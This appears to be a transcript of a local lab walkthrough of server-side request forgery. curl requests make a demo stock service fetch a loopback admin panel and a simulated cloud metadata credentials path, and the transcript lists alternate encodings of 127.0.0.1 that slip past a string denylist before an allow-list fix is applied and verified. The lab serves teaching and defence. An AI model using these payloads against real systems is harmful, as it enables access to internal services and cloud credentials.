=== b-ssrf walkthrough transcript ===
date: 2026-10-09  python: Python 3.12.3  curl: curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13 zlib/1.3 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 (+libidn2/2.3.7) libssh/0.10.6/openssl/zlib nghttp2/1.59.0 librtmp/2.3 OpenLDAP/2.6.10
env: loopback only, no Docker on this machine (labeled local demo)
note: the 'metadata' tree is a labeled simulation on loopback; no real cloud endpoints touched

--- step 1: start both servers + baseline ---
ssrf demo public=127.0.0.1:8325 internal=127.0.0.1:8326 FIXED=False
$ curl -d 'stockApi=http://127.0.0.1:8325/products/1/stock' localhost:8325/product/stock
{"product":1,"stock":14}

--- step 2: SSRF against loopback admin ---
$ curl -d 'stockApi=http://127.0.0.1:8326/admin' localhost:8325/product/stock
INTERNAL ADMIN PANEL -- loopback only, no auth required

--- step 3: SSRF against metadata simulation (role name only) ---
$ curl -d 'stockApi=http://127.0.0.1:8326/latest/meta-data/iam/security-credentials/' ...
demo-app-role

--- step 4: why string denylists fail (validator layer) ---
A naive denylist checks the STRING; the network stack resolves the NAME.
denylist says: ALLOW  network stack resolves 2130706433         -> 127.0.0.1   url=http://2130706433:8326/admin
denylist says: ALLOW  network stack resolves 127.1              -> 127.0.0.1   url=http://127.1:8326/admin
denylist says: ALLOW  network stack resolves 0x7f.0.0.1         -> 127.0.0.1   url=http://0x7f.0.0.1:8326/admin
(Python's urllib normalizes some of these forms, so the demo fetches
 the canonical 127.0.0.1; curl, Java, and browsers follow the alternates
 to loopback. The bypass class lives in the VALIDATOR, not the fetcher.)

--- step 5: apply fix (allow-list + canonicalized validation + no redirects) ---
ssrf demo public=127.0.0.1:8325 internal=127.0.0.1:8326 FIXED=True
--- step 6: verify fix, four cases ---
[loopback admin]:
fetch refused: resolved IP 127.0.0.1 in deny range
[decimal-octet bypass]:
fetch refused: resolved IP 127.0.0.1 in deny range
[metadata]:
fetch refused: resolved IP 127.0.0.1 in deny range
[legitimate, via allow-list id]:
{"product":1,"stock":14}

